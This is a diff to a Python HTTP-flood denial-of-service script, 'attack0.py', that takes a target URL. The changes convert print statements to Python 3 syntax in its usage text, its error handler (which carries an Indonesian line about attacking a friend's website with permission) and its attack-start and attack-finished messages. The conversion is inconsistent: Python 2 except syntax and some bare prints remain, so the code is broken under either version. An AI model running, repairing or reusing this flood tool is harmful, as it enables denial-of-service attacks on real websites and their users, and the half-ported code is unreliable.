@@ -60,10 +60,10 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python attack0.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
-	print '---------------------------------------------------'
+	print ('---------------------------------------------------')
+	print ('USAGE: python attack0.py <url>')
+	print ('you can add "safe" after url, to autoshut after dos')
+	print ('---------------------------------------------------')
 
 	
 #http request
@@ -88,7 +88,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Attacking Website Teman sdh Izin Dulu 10101010101010101'
+			print ('Attacking Website Teman sdh Izin Dulu 10101010101010101')
 			code=10101010101010101
 	except urllib2.URLError, e:
 			#print e.reason
@@ -119,7 +119,7 @@ class MonitorThread(threading.Thread):
 				print "%d Find Target" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- attack0 Attack Finished --"
+			print ("\n-- attack0 Attack Finished --")
 
 #execute 
 if len(sys.argv) < 2:
@@ -130,7 +130,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- attack0 Attack Started --"
+		print ("-- attack0 Attack Started --")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
